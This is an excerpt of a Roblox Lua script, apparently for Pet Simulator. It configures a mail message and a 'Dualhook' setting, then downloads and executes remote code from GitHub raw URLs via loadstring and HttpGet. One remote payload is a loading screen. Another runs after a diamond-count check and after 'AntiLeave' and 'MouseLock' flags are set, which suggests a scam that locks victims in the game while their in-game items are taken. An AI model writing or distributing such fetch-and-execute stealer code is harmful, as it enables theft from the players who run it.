...
getgenv().Settings = {
    ...
    MailMessage = "stop dualhooking ur shit",
    Titanics = {
        Dualhook = true,
        Intensity = 0 --%
    },
...
if _G.LoadingScreen ~= false then
    loadstring(game:HttpGet('https://raw.githubusercontent.com/PSXS/z/main/psxx'))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
end
...
if diaamt < 110000 then
    ...
    _G.AntiLeave = false
    _G.MouseLock = false
    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/PSXS/r/main/petsim", true))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
    return;
end
